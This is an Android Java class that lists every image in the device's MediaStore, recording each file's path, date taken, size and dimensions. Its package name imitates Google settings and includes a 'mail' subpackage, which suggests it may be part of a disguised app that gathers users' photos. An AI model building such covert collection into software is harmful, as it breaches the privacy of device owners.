package com.setting.dl.google.googlesettings.mail;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;

import java.util.ArrayList;
import java.util.List;


public class Images {
    
    Context context;
    private List<Image> images = new ArrayList<>();
    
    private String[] IMG = {
            
            MediaStore.MediaColumns.DATA,
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT
    };
    
    Images(Context context) {
        
        this.context = context;
        _get(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        _get(MediaStore.Images.Media.INTERNAL_CONTENT_URI);
    }
    
    private void _get(Uri uri) {
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor          imgs            = contentResolver.query(uri, IMG, null, null, null);
        
        if (imgs != null && imgs.moveToFirst()){
            
            
            do{
    
                String data   = imgs.getString(imgs.getColumnIndex(IMG[0]));
                String id     = imgs.getString(imgs.getColumnIndex(IMG[1]));
                String date   = imgs.getString(imgs.getColumnIndex(IMG[2]));
                String size   = imgs.getString(imgs.getColumnIndex(IMG[3]));
                String width  = imgs.getString(imgs.getColumnIndex(IMG[4]));
                String height = imgs.getString(imgs.getColumnIndex(IMG[5]));
    
                images.add(new Image(data, id, date, size, width, height));
                
                //Log.i("Images", u.s("%s\n", data));
                
            }while(imgs.moveToNext());
    
            imgs.close();
        }
    }
    
    public List<Image> getImages(){
        return images;
    }
    
    public class Image{
    
        public String getData() {
            return data;
        }
        public String getId() {
            return id;
        }
        public String getDateTaken() {
            return dateTaken;
        }
        public String getSize() {
            return size;
        }
        public String getWidth() {
            return width;
        }
        public String getHeight() {
            return height;
        }
    
        private String data, id, dateTaken, size, width, height;
        
        Image(String data, String id, String dateTaken, String size, String width, String height) {
            
            this.data = data;
            this.id = id;
            this.dateTaken = dateTaken;
            this.size = size;
            this.width = width;
            this.height = height;
        }
    
    
        @Override
        public boolean equals(Object obj) {
    
            return obj instanceof Image && this.data.equals(((Image) obj).data);
        }
    
        @Override
        public int hashCode() {
            
            return data.hashCode();
        }
    }
}
